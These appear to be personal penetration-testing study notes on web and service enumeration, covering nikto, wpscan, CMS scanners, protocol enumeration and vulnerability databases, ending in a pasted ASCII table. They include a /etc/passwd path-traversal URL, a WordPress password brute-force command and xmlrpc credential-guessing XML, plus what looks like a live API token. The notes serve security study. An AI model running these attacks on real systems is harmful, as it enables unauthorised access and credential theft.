| 301 - Moved Permanently | Moved Permanently - This redirects the client's browser to a new webpage or tells search engines that the page has moved somewhere else and to look there instead. |
| 302 - Found | This redirects the client's browser to a new webpage or tells search engines that the page has moved somewhere else and to look there instead. |
| 400 | Solicitud incorrecta - La solicitud no se pudo entender o procesar. |
| 401 | No autorizado - Se requiere autenticación o la autenticación ha fallado. |
| 403 | Prohibido - El servidor ha entendido la solicitud, pero se niega a cumplirla. |
| 404 | No encontrado - El recurso solicitado no se encuentra en el servidor. |
| 500 | Error interno del servidor - El servidor ha encontrado una situación inesperada. |
| 503 - Service Unavailable | This server cannot handle your request as it's either overloaded or down for maintenance. |


</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



	/usr/share/wordlists/dirbuster/directory-list-2.3-*.txt
	/usr/share/wordlists/dirbuster/directory-list-1.0.txt
	/usr/share/wordlists/dirb/big.txt
	/usr/share/wordlists/dirb/common.txt
	/usr/share/wordlists/dirb/small.txt
	/usr/share/wordlists/dirb/extensions_common.txt - Useful for when fuzzing for files!

</div></div>


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- To make web pages
- high level
- No coding
- meet the target
- logs along time
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



scan page to get important info

	whatweb IP

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- To scan vulns of pages.
- discover possible vulnerabilities: Sensitive files, Outdated servers and programs (i.e. [vulnerable web server installs](https://httpd.apache.org/security/vulnerabilities_24.html)), Common server and software misconfigurations (Directory indexing, cgi scripts, x-ss protections)
- webserver or application (I.e. Apache2, Apache Tomcat, Jenkins or JBoss) and will look for any sensitive files or directories (i.e. login.php, /admin/, etc)

| Option                                        | Description                                                                   |
| --------------------------------------------- | ----------------------------------------------------------------------------- |
| `nikto -h IPordomain`                         | Basic scan, retrieve the headers, look for any sensitive files or directories |
| `nikto -h 10.10.10.1 -p 80,8000,8080`         | Set ip and ports                                                              |
| `nmap -p80 172.16.0.0/24 -oG - \| nikto -h -` | Get the nmap output and do the scan                                           |
| `--list-plugins`                              | List them                                                                     |
| `nikto -h 10.10.10.1 -Plugin apacheuser`      | Use the apache plugin                                                         |
| `-Display 2`                                  | Verbose 1,2 or E                                                              |
| `-Tuning 0`                                   | Tuning vulns scan 0,1,2,3.....                                                |
| `nikto -h http://ip_address -o report.html`   | Save file to html, or txt<br>It could be specificated the format with `-f`    |
## Plugins
| Plugin Name   | Description                                                                                                                                                                           |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| apacheusers   | Attempt to enumerate Apache HTTP Authentication Users                                                                                                                                 |
| cgi           | Look for CGI scripts that we may be able to exploit                                                                                                                                   |
| robots        | Analyse the robots.txt file which dictates what files/folders we are able to navigate to                                                                                              |
| dir_traversal | Attempt to use a directory traversal attack (i.e. LFI) to look for system files such as /etc/passwd on Linux (http://ip_address/application.php?view=../../../../../../../etc/passwd) |
## Verbosing our Scan
| Argument | Description                                          | Reasons for Use                                                                                                                                                                                                         |
| -------- | ---------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1        | Show any redirects that are given by the web server. | Web servers may want to relocate us to a specific file or directory, so we will need to adjust our scan accordingly for this.                                                                                           |
| 2        | Show any cookies received                            | Applications often use cookies as a means of storing data. For example, web servers use sessions, where e-commerce sites may store products in your basket as these cookies. Credentials can also be stored in cookies. |
| E        | Output any errors                                    | This will be useful for debugging if your scan is not returning the results that you expect!                                                                                                                            |
## Tuning Your Scan for Vulnerability Searching
only include the ones that you may commonly use.

| Category Name                     | Description                                                                                                                                                        | Tuning Option |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------- |
| File Upload                       | Search for anything on the web server that may permit us to upload a file. This could be used to upload a reverse shell for an application to execute.             | 0             |
| Misconfigurations / Default Files | Search for common files that are sensitive (and shouldn't be accessible such as configuration files) on the web server.                                            | 2             |
| Information Disclosure            | Gather information about the web server or application (i.e. verison numbers, HTTP headers, or any information that may be useful to leverage in our attack later) | 3             |
| Injection                         | Search for possible locations in which we can perform some kind of injection attack such as XSS or HTML                                                            | 4             |
| Command Execution                 | Search for anything that permits us to execute OS commands (such as to spawn a shell)                                                                              | 8             |
| SQL Injection                     | Look for applications that have URL parameters that are vulnerable to SQL Injection                                                                                | 9             |


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Sensitive Information Disclosure (Plugin & Theme installation versions for disclosed vulnerabilities or CVE's)
- Path Discovery (Looking for misconfigured file permissions i.e. wp-config.php)
- Weak Password Policies (Password bruteforcing)
- Presence of Default Installation (Looking for default files)
- Testing Web Application Firewalls (Common WAF plugins)

| Command                                                                                       | Desctiption                                                                                           |
| --------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| `wpscan --update`                                                                             | update this database before performing any scans.                                                     |
| `wpscan --url http://IP:port`                                                                 | Scan a url                                                                                            |
| `wpscan -hh`                                                                                  | Help                                                                                                  |
| `wpscan --url http://IP:port -e vp,u`                                                         | enumerate, vuln plugins, users                                                                        |
| `wpscan --url http://IP:port -e vp --api-token="fk9Rjv6oBOPBqYjqrjQRkRZV8iwR0XpUgUTXLZ4heDc"` | token                                                                                                 |
|                                                                                               | Enumerate Installed Themes                                                                            |
|                                                                                               |                                                                                                       |
| `wpscan --url http://cmnatics.playground/ --enumerate p`                                      | Enumerate Plugins                                                                                     |
| `wpscan --url http://cmnatics.playground/ --enumerate t`                                      | Enumerate Themes                                                                                      |
| `wpscan --url http://cmnatics.playground/ --enumerate u`                                      | Enumerate Usernames                                                                                   |
| `wpscan --url http://cmnatics.playground/ --enumerate vp`                                     | Use WPVulnDB to cross-reference for vulnerabilities. Example command looks for vulnerable plugins (p) |
| `wpscan –-url http://cmnatics.playground –-passwords rockyou.txt –-usernames cmnatic`         | Performing a Password Attack                                                                          |
| `--plugins-detection aggressive`                                                              | This is an aggressiveness profile for WPScan to use.                                                  |

xmlrpc

	wpscan --url http://IP:port -U username -P /usr/share/rockyou.txt

## Enumerating for Installed Themes
```sh
wpscan --url http://cmnatics.playground/ --enumerate t
```
### Manual
Using the "Network" tab in your web browsers developer tools
![Pasted image 20240510112227.png](/img/user/Pasted%20image%2020240510112227.png)


inspecting the source code of the website, we can note additional references to "twentytwentyone"
![Pasted image 20240510112344.png](/img/user/Pasted%20image%2020240510112344.png)
## Enumerating for Installed Plugins
-  A very common feature of webservers is "Directory Listing" and is often enabled by default
- Simply, "Directory Listing" is the listing of files in the directory that we are navigating to
```sh
wpscan --url http://cmnatics.playground/ --enumerate p
```

A very common file is "index.html" and "index.php". As these files aren't present in /a/directory, the contents are instead displayed:
![Pasted image 20240510122541.png](/img/user/Pasted%20image%2020240510122541.png)

## Enumerating for Users
- WordPress sites use authors for posts. Authors are in fact a type of user.
![Pasted image 20240510123641.png](/img/user/Pasted%20image%2020240510123641.png)
## **The "Vulnerable" Flag**
WPScan has the `v` argument for the `--enumerate` flag. We provide this argument alongside another (such as `p` for plugins). For example, our syntax would like so: `wpscan --url http://cmnatics.playground/ --enumerate vp`
**Note, that this requires setting up WPScan to use the WPVulnDB API which is out-of-scope for this room.**
## Performing a Password Attack
erform a bruteforcing technique against the username we specify and a password list that we provide.
## Adjusting WPScan's Aggressiveness (WAF)
- Unless specified, WPScan will try to be as least "noisy" as possible.
- Lots of requests to a web server can trigger things such as firewalls and ultimately result in you being blocked by the server.

</div></div>

### Enum plugins
```shell
curl -s -x GET "webpage.com_oripandport" | grep plugins
```
### Regular expresion (regex)
```sh
curl -s -x GET "webpage.com_oripandport" | grep -oP 'plugins/\K[^/]+' | sort -u
```
### File xmlrpc
https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/
check important file

	IP:PORT/xmlrpc.php
test post

	curl -s -X POST "IP:PORT/xmlrpc.php"
If accept, search abussing file
search available methods to enum valid credentials (wp.getUserlogs)
List methods

	curl -s -X POST "IP:PORT/xmlrpc.php" -d@file.xml

file.xml

	<?xml version="1.0" encoding="utf-8"?> 
	<methodCall> 
	<methodName>system.listMethods</methodName> 
	<params></params> 
	</methodCall>

Brute force attack
Test reques with file2 attack
file2.xml

	<?xml version="1.0" encoding="UTF-8"?>
	<methodCall> 
	<methodName>wp.getUsersBlogs</methodName> 
	<params> 
	<param><value>\{\{your username\}\}</value></param> 
	<param><value>\{\{your password\}\}</value></param> 
	</params> 
	</methodCall>

### wpseku

### wordprescan

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



joomscan

	https://github.com/OWASP/joomscan

install

	git clone https://github.com/rezasp/joomscan.git
	cd joomscan
	perl joomscan.pl

exec scan

	perl joomscan.pl -u <URL>

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



### Droopescan
https://github.com/SamJoan/droopescan

Install
```sh
sudo pip install droopescan
```

Scan
```sh
droopescan scan drupal --url https://example.com
```

### drupwn

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



### magescan
https://github.com/steverobbins/magescan
```sh
php magescan.phar scan:all https://example.com
```

### magereport
https://www.magereport.com/

</div></div>

## builtiwith
- Online
- Find out what websites are Built With
https://builtwith.com/

</div></div>

## Get versions
```sh
curl -I http://192.168.5.160/redteam/index.php
```
# Others
## SSH
```sh
sudo nmap -sCV -p22 127.0.0.1
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
https://launchpad.net/ubuntu
OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
## PSTools
Tool to use on windows
[[PsExec\|PsExec]]
PsList - List detailed info from processes
PsLoggedOn - Who is logged, PsGetSid, PsLogList, PsKill, PsPasswd, PsInfo, PsShutdown
## NetYou
Tool to windows
Over host and over domain
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



162 TCP/UDP SNMP trap
Solve isues
Use on Routers, switchers
Numering accounts and users
Aplication layer

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Windows tool
Tool to scan, shared folders
Works with others protocols

</div></div>

# Protocols and services
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Lightweigth directory Access protocol
TCP 389
SHow Logic structure 
Get Users

## Tools to scan
Softerra
LDAP admin tool
LDAP Account manager
LDAP search
JXplorer
AD Explorer

</div></div>

## [[Networking/NTP#NTP enumeration\|NTP#NTP enumeration]]
## [[NFS#NFS enumeration\|NFS#NFS enumeration]]
## [[Hacking Ético y Pentesting/SMB#SMB enumeration\|SMB#SMB enumeration]]
## [[Networking/FTP#FTP TFTP Enumeration\|FTP#FTP TFTP Enumeration]]
## [[Networking/SMTP\|SMTP]]
## [[Hacking Ético y Pentesting/DNS\|DNS]]
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



(solo soporta unicast2) 
(hay ESP y AH), ESP es más seguro porque tiene confidencialidad
Confidencialidad (DES, 3DES o [[AES\|AES]])		
Integridad (SHA, MD5)
Autenticación (SHA, MD5)
Antireplay (SHA, MD5)

Tools to scan
	[[Hacking Ético y Pentesting/nmap\|nmap]]
	ike-scan
		to get handshake

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Used on Login season SIP
UDP/TCP 2000 2001 5050 5061

Tools to scan
	svmap
	metasploit

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- remote procedure call 
- Comunitacion between client and server

Tools to scan
	zenmap
	netscantools

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



To scan
	rusers
	rwho
	finger

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



SMB port 445
To scan use nmap

</div></div>


## [[Hacking Ético y Pentesting/Enumeration Countermeasures\|Enumeration Countermeasures]]

</div></div>

# 2 Resource Development
Preparatory activities aimed at setting up the infrastructure required for the attack.
# 3 Delivery
Techniques resulting in the transmission of a weaponized object to the targeted environment.
# 4 Social Engineering
Techniques aimed at the manipulation of people to perform unsafe actions.
# 5 Exploitation
Techniques to exploit vulnerabilities in systems that may, amongst others, result in code execution.
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



#  
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- To scan vulns of pages.
- discover possible vulnerabilities: Sensitive files, Outdated servers and programs (i.e. [vulnerable web server installs](https://httpd.apache.org/security/vulnerabilities_24.html)), Common server and software misconfigurations (Directory indexing, cgi scripts, x-ss protections)
- webserver or application (I.e. Apache2, Apache Tomcat, Jenkins or JBoss) and will look for any sensitive files or directories (i.e. login.php, /admin/, etc)

| Option                                        | Description                                                                   |
| --------------------------------------------- | ----------------------------------------------------------------------------- |
| `nikto -h IPordomain`                         | Basic scan, retrieve the headers, look for any sensitive files or directories |
| `nikto -h 10.10.10.1 -p 80,8000,8080`         | Set ip and ports                                                              |
| `nmap -p80 172.16.0.0/24 -oG - \| nikto -h -` | Get the nmap output and do the scan                                           |
| `--list-plugins`                              | List them                                                                     |
| `nikto -h 10.10.10.1 -Plugin apacheuser`      | Use the apache plugin                                                         |
| `-Display 2`                                  | Verbose 1,2 or E                                                              |
| `-Tuning 0`                                   | Tuning vulns scan 0,1,2,3.....                                                |
| `nikto -h http://ip_address -o report.html`   | Save file to html, or txt<br>It could be specificated the format with `-f`    |
## Plugins
| Plugin Name   | Description                                                                                                                                                                           |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| apacheusers   | Attempt to enumerate Apache HTTP Authentication Users                                                                                                                                 |
| cgi           | Look for CGI scripts that we may be able to exploit                                                                                                                                   |
| robots        | Analyse the robots.txt file which dictates what files/folders we are able to navigate to                                                                                              |
| dir_traversal | Attempt to use a directory traversal attack (i.e. LFI) to look for system files such as /etc/passwd on Linux (http://ip_address/application.php?view=../../../../../../../etc/passwd) |
## Verbosing our Scan
| Argument | Description                                          | Reasons for Use                                                                                                                                                                                                         |
| -------- | ---------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1        | Show any redirects that are given by the web server. | Web servers may want to relocate us to a specific file or directory, so we will need to adjust our scan accordingly for this.                                                                                           |
| 2        | Show any cookies received                            | Applications often use cookies as a means of storing data. For example, web servers use sessions, where e-commerce sites may store products in your basket as these cookies. Credentials can also be stored in cookies. |
| E        | Output any errors                                    | This will be useful for debugging if your scan is not returning the results that you expect!                                                                                                                            |
## Tuning Your Scan for Vulnerability Searching
only include the ones that you may commonly use.

| Category Name                     | Description                                                                                                                                                        | Tuning Option |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------- |
| File Upload                       | Search for anything on the web server that may permit us to upload a file. This could be used to upload a reverse shell for an application to execute.             | 0             |
| Misconfigurations / Default Files | Search for common files that are sensitive (and shouldn't be accessible such as configuration files) on the web server.                                            | 2             |
| Information Disclosure            | Gather information about the web server or application (i.e. verison numbers, HTTP headers, or any information that may be useful to leverage in our attack later) | 3             |
| Injection                         | Search for possible locations in which we can perform some kind of injection attack such as XSS or HTML                                                            | 4             |
| Command Execution                 | Search for anything that permits us to execute OS commands (such as to spawn a shell)                                                                              | 8             |
| SQL Injection                     | Look for applications that have URL parameters that are vulnerable to SQL Injection                                                                                | 9             |


</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



To scan vulns set specification about the software and version
```shell
searchsploit name_of_software
```

| Option | Description                                       |
| ------ | ------------------------------------------------- |
| `-t`   | Filter by tiitle of exploit                       |
| `-w`   | Show exploit url                                  |
| `-e`   | Search by exact name of exploit                   |
| `-p`   | Show the complete path of an exploit              |
| `-m`   | Make a mirror of the exploit in the local machine |
| `-U`   | Update                                            |
|        |                                                   |


</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Install In docker
```sh
sudo docker run -d -p 443:443 --name openvas mikesplain/openvas
```

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Install
- https://www.tenable.com/products/nessus/nessus-essentials
- Download `-deb`
- `sudo dpkg -i **package_file.deb**`

start the Nessus Service

	sudo systemctl start nessusd.service

web main page

	https://localhost:8834/

# mergeness
- To join nessus informs to a 1 inform
1. Put all files in a folder
2. In that folder copy the .py tool
3. Run tool

</div></div>

# Qualys
# Tools for Windows
## Retina
## Acunetix
## Netsparker

# Make a driagram
## Maltego casefile
# Vuln search
https://www.exploit-db.com/
https://nvd.nist.gov/vuln/search
https://cve.mitre.org/
[[Hacking Ético y Pentesting/searchsploit\|searchsploit]]
MSVR
vuldb.com
security focus
security magazine
security focus
dark reading
pentestmagazine
help net security
security tracker
sc magazine
hacker storm
trendmicro
computerworld

## vuln evaluation 
To identify weak points
predict the security of system 

areas
	Network vulns
	open ports and running services
	app vulns and services
	app ans services config errors

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- https://www.first.org/cvss/calculator/3.1
- Common Vulnerability Scoring System, permite realizar la valoración de una vulnerabilidad, con el objetivo de clasificar la criticidad de las vulnerabilidades.
- Mantenido por FIRST (Incident Response and Security Teams), alianza de equipos de respuesta ante incidentes que promueven el manejo efectivo de incidentes de seguridad, de forma reactiva y proactiva.
- La principal ventaja que posee esta valoración es la **utilización de diferentes métricas** con el objetivo de lograr una evaluación lo más objetiva posible.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- https://cwe.mitre.org/
- Common Weakness Enumeration, es un listado de vulnerabilidades de software el cual está destinado principalmente a desarrolladores.

</div></div>

## CAPEC


<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Indicator of attack
code execution
persistence
c2
lateral moves

</div></div>


##
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Indicadors of compromises
- Commercial and industrial sources
- Free IoC sources
- Malware
- signatures
- exploits
- vulns
- IPs

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



1. idenfity and understand business proccess
2. Identify apps, data, services, 
3. Identify test software,drivers and config
4. Create a list of actives
5. Understand the net arch 
6. Identify controls already running
7. understand politics
8. Identify scope of evaluators
9. Create protocols to protect 


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



1. Examinate the fphysic sec
2. Test human or config errors
3. Run vulns test tools
4. Select type of analisys according the business
5. Identify and prioritize vulns
6. Identify False + and false -
7. Apply the context of business to results
8. Compitale OSINT results to  test vulns
9. Create an vulns analisis report

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Clasify risks
Evaluate impact level
Identify threat and risk

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



First correct according the risks
Create an action plan
Apply patchs fixes
Capacitation of sensibility

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Rescan to test if the solution was solved
Dinamics analisys
check the attack surface

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Periodic analysis
Periodic Correct vulns
Logs of intrusions and prevention oof it
Implement politics

</div></div>



</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Bad config
Defaults passwords on wordpress or firewall
Human errors
No knowledge


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Don't delete logs
Bad installation
error ex. a server with an web browser

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Extra code

## Tools to detect it
Ollydbg
veracode
flawfinder
kiuwan
splint
bovstt

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Stack overflow attack
	More common attack call overflow
heap overflow attack
	Focus to group of memory
Integer overflow attack
	An very large integer data that can't be stored and can produce a overflow
Unicode overflow
	Insert ASCII chars to try overflow

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Reference to ASCII Table of Windows-1252

**ASCII**, stands for American Standard Code for Information Interchange. It is a [7-bit](https://www.ascii-code.com/glossary/7-bit) character code where each individual bit represents a unique character. This page shows the [extended ASCII](https://www.ascii-code.com/glossary/extended-ascii) table which is **based on the Windows-1252** character set which is an [8 bit](https://www.ascii-code.com/glossary/8-bit) ASCII table with 256 characters and symbols. It includes all ASCII codes from standard ASCII, and it is a superset of [ISO 8859-1](https://www.ascii-code.com/ISO-8859-1) in terms of printable characters. In the range 128 to 159 (hex 80 to 9F), ISO/IEC 8859-1 has invisible control characters, while Windows-1252 has writable characters. Windows-1252 is probably the most-used 8-bit character encoding in the world.

## ASCII control characters (character code 0-31)

The first 32 characters in the ASCII-table are unprintable control codes and are used to control peripherals such as printers.

|DEC|OCT|HEX|BIN|Symbol|HTML Number|HTML Name|Description|
|---|---|---|---|---|---|---|---|
|[0](https://www.ascii-code.com/0 "ASCII Code 0")|000|00|00000000|NUL|&#00;||Null character|
|[1](https://www.ascii-code.com/1 "ASCII Code 1")|001|01|00000001|SOH|&#01;||Start of Heading|
|[2](https://www.ascii-code.com/2 "ASCII Code 2")|002|02|00000010|STX|&#02;||Start of Text|
|[3](https://www.ascii-code.com/3 "ASCII Code 3")|003|03|00000011|ETX|&#03;||End of Text|
|[4](https://www.ascii-code.com/4 "ASCII Code 4")|004|04|00000100|EOT|&#04;||End of Transmission|
|[5](https://www.ascii-code.com/5 "ASCII Code 5")|005|05|00000101|ENQ|&#05;||Enquiry|
|[6](https://www.ascii-code.com/6 "ASCII Code 6")|006|06|00000110|ACK|&#06;||Acknowledge|
|[7](https://www.ascii-code.com/7 "ASCII Code 7")|007|07|00000111|BEL|&#07;||Bell, Alert|
|[8](https://www.ascii-code.com/8 "ASCII Code 8")|010|08|00001000|BS|&#08;||Backspace|
|[9](https://www.ascii-code.com/9 "ASCII Code 9")|011|09|00001001|HT|&#09;||Horizontal Tab|
|[10](https://www.ascii-code.com/10 "ASCII Code 10")|012|0A|00001010|LF|&#10;||Line Feed|
|[11](https://www.ascii-code.com/11 "ASCII Code 11")|013|0B|00001011|VT|&#11;||Vertical Tabulation|
|[12](https://www.ascii-code.com/12 "ASCII Code 12")|014|0C|00001100|FF|&#12;||Form Feed|
|[13](https://www.ascii-code.com/13 "ASCII Code 13")|015|0D|00001101|CR|&#13;||Carriage Return|
|[14](https://www.ascii-code.com/14 "ASCII Code 14")|016|0E|00001110|SO|&#14;||Shift Out|
|[15](https://www.ascii-code.com/15 "ASCII Code 15")|017|0F|00001111|SI|&#15;||Shift In|
|[16](https://www.ascii-code.com/16 "ASCII Code 16")|020|10|00010000|DLE|&#16;||Data Link Escape|
|[17](https://www.ascii-code.com/17 "ASCII Code 17")|021|11|00010001|DC1|&#17;||Device Control One (XON)|
|[18](https://www.ascii-code.com/18 "ASCII Code 18")|022|12|00010010|DC2|&#18;||Device Control Two|
|[19](https://www.ascii-code.com/19 "ASCII Code 19")|023|13|00010011|DC3|&#19;||Device Control Three (XOFF)|
|[20](https://www.ascii-code.com/20 "ASCII Code 20")|024|14|00010100|DC4|&#20;||Device Control Four|
|[21](https://www.ascii-code.com/21 "ASCII Code 21")|025|15|00010101|NAK|&#21;||Negative Acknowledge|
|[22](https://www.ascii-code.com/22 "ASCII Code 22")|026|16|00010110|SYN|&#22;||Synchronous Idle|
|[23](https://www.ascii-code.com/23 "ASCII Code 23")|027|17|00010111|ETB|&#23;||End of Transmission Block|
|[24](https://www.ascii-code.com/24 "ASCII Code 24")|030|18|00011000|CAN|&#24;||Cancel|
|[25](https://www.ascii-code.com/25 "ASCII Code 25")|031|19|00011001|EM|&#25;||End of medium|
|[26](https://www.ascii-code.com/26 "ASCII Code 26")|032|1A|00011010|SUB|&#26;||Substitute|
|[27](https://www.ascii-code.com/27 "ASCII Code 27")|033|1B|00011011|ESC|&#27;||Escape|
|[28](https://www.ascii-code.com/28 "ASCII Code 28")|034|1C|00011100|FS|&#28;||File Separator|
|[29](https://www.ascii-code.com/29 "ASCII Code 29")|035|1D|00011101|GS|&#29;||Group Separator|
|[30](https://www.ascii-code.com/30 "ASCII Code 30")|036|1E|00011110|RS|&#30;||Record Separator|
|[31](https://www.ascii-code.com/31 "ASCII Code 31")|037|1F|00011111|US|&#31;||Unit Separator|

## ASCII printable characters (character code 32-127)

Codes 32-127 are common for all the different variations of the ASCII table, they are called printable characters, represent letters, digits, punctuation marks, and a few miscellaneous symbols. You will find almost every character on your keyboard. Character 127 represents the command DEL.

|DEC|OCT|HEX|BIN|Symbol|HTML Number|HTML Name|Description|
|---|---|---|---|---|---|---|:--|
|[32](https://www.ascii-code.com/32 "ASCII Code 32")|040|20|00100000|SP|&#32;||Space|
|[33](https://www.ascii-code.com/33 "ASCII Code 33")|041|21|00100001|!|&#33;|&excl;|Exclamation mark|
|[34](https://www.ascii-code.com/34 "ASCII Code 34")|042|22|00100010|"|&#34;|&quot;|Double quotes (or speech marks)|
|[35](https://www.ascii-code.com/35 "ASCII Code 35")|043|23|00100011|#|&#35;|&num;|Number sign|
|[36](https://www.ascii-code.com/36 "ASCII Code 36")|044|24|00100100|$|&#36;|&dollar;|Dollar|
|[37](https://www.ascii-code.com/37 "ASCII Code 37")|045|25|00100101|%|&#37;|&percnt;|Per cent sign|
|[38](https://www.ascii-code.com/38 "ASCII Code 38")|046|26|00100110|&|&#38;|&amp;|Ampersand|
|[39](https://www.ascii-code.com/39 "ASCII Code 39")|047|27|00100111|'|&#39;|&apos;|Single quote|
|[40](https://www.ascii-code.com/40 "ASCII Code 40")|050|28|00101000|(|&#40;|&lparen;|Open parenthesis (or open bracket)|
|[41](https://www.ascii-code.com/41 "ASCII Code 41")|051|29|00101001|)|&#41;|&rparen;|Close parenthesis (or close bracket)|
|[42](https://www.ascii-code.com/42 "ASCII Code 42")|052|2A|00101010|*|&#42;|&ast;|Asterisk|
|[43](https://www.ascii-code.com/43 "ASCII Code 43")|053|2B|00101011|+|&#43;|&plus;|Plus|
|[44](https://www.ascii-code.com/44 "ASCII Code 44")|054|2C|00101100|,|&#44;|&comma;|Comma|
|[45](https://www.ascii-code.com/45 "ASCII Code 45")|055|2D|00101101|-|&#45;||Hyphen-minus|
|[46](https://www.ascii-code.com/46 "ASCII Code 46")|056|2E|00101110|.|&#46;|&period;|Period, dot or full stop|
|[47](https://www.ascii-code.com/47 "ASCII Code 47")|057|2F|00101111|/|&#47;|&sol;|Slash or divide|
|[48](https://www.ascii-code.com/48 "ASCII Code 48")|060|30|00110000|0|&#48;||Zero|
|[49](https://www.ascii-code.com/49 "ASCII Code 49")|061|31|00110001|1|&#49;||One|
|[50](https://www.ascii-code.com/50 "ASCII Code 50")|062|32|00110010|2|&#50;||Two|
|[51](https://www.ascii-code.com/51 "ASCII Code 51")|063|33|00110011|3|&#51;||Three|
|[52](https://www.ascii-code.com/52 "ASCII Code 52")|064|34|00110100|4|&#52;||Four|
|[53](https://www.ascii-code.com/53 "ASCII Code 53")|065|35|00110101|5|&#53;||Five|
|[54](https://www.ascii-code.com/54 "ASCII Code 54")|066|36|00110110|6|&#54;||Six|
|[55](https://www.ascii-code.com/55 "ASCII Code 55")|067|37|00110111|7|&#55;||Seven|
|[56](https://www.ascii-code.com/56 "ASCII Code 56")|070|38|00111000|8|&#56;||Eight|
|[57](https://www.ascii-code.com/57 "ASCII Code 57")|071|39|00111001|9|&#57;||Nine|
|[58](https://www.ascii-code.com/58 "ASCII Code 58")|072|3A|00111010|:|&#58;|&colon;|Colon|
|[59](https://www.ascii-code.com/59 "ASCII Code 59")|073|3B|00111011|;|&#59;|&semi;|Semicolon|
|[60](https://www.ascii-code.com/60 "ASCII Code 60")|074|3C|00111100|<|&#60;|&lt;|Less than (or open angled bracket)|
|[61](https://www.ascii-code.com/61 "ASCII Code 61")|075|3D|00111101|=|&#61;|&equals;|Equals|
|[62](https://www.ascii-code.com/62 "ASCII Code 62")|076|3E|00111110|>|&#62;|&gt;|Greater than (or close angled bracket)|
|[63](https://www.ascii-code.com/63 "ASCII Code 63")|077|3F|00111111|?|&#63;|&quest;|Question mark|
|[64](https://www.ascii-code.com/64 "ASCII Code 64")|100|40|01000000|@|&#64;|&commat;|At sign|
|[65](https://www.ascii-code.com/65 "ASCII Code 65")|101|41|01000001|A|&#65;||Uppercase A|
|[66](https://www.ascii-code.com/66 "ASCII Code 66")|102|42|01000010|B|&#66;||Uppercase B|
|[67](https://www.ascii-code.com/67 "ASCII Code 67")|103|43|01000011|C|&#67;||Uppercase C|
|[68](https://www.ascii-code.com/68 "ASCII Code 68")|104|44|01000100|D|&#68;||Uppercase D|
|[69](https://www.ascii-code.com/69 "ASCII Code 69")|105|45|01000101|E|&#69;||Uppercase E|
|[70](https://www.ascii-code.com/70 "ASCII Code 70")|106|46|01000110|F|&#70;||Uppercase F|
|[71](https://www.ascii-code.com/71 "ASCII Code 71")|107|47|01000111|G|&#71;||Uppercase G|
|[72](https://www.ascii-code.com/72 "ASCII Code 72")|110|48|01001000|H|&#72;||Uppercase H|
|[73](https://www.ascii-code.com/73 "ASCII Code 73")|111|49|01001001|I|&#73;||Uppercase I|
|[74](https://www.ascii-code.com/74 "ASCII Code 74")|112|4A|01001010|J|&#74;||Uppercase J|
|[75](https://www.ascii-code.com/75 "ASCII Code 75")|113|4B|01001011|K|&#75;||Uppercase K|
|[76](https://www.ascii-code.com/76 "ASCII Code 76")|114|4C|01001100|L|&#76;||Uppercase L|
|[77](https://www.ascii-code.com/77 "ASCII Code 77")|115|4D|01001101|M|&#77;||Uppercase M|
